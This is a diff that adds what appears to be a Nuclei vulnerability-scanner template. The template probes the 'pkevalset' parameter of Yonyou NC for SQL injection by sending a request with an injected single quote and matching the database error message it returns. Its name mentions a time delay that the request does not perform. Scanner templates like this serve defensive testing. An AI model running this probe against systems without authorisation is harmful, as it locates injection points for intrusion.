@@ -1,0 +1,26 @@
+id: YongYouNC-pkevalset_sqlInjection
+
+info:
+  name: SQLi Time Delay (Windows Compatible)
+  author: iSee857
+  severity: high
+  description: YongYouNC-pkevalset_sqlInjection
+
+requests:
+  - method: GET
+    raw:
+      - |
+        GET /ebvp/expeval/expertschedule;1.jpg?pkevalset=1' HTTP/1.1
+        Host: {{Host}}
+        Accept: */*
+        Connection: close
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "查询错误：sql"
+
+      - type: status
+        status:
+          - 200
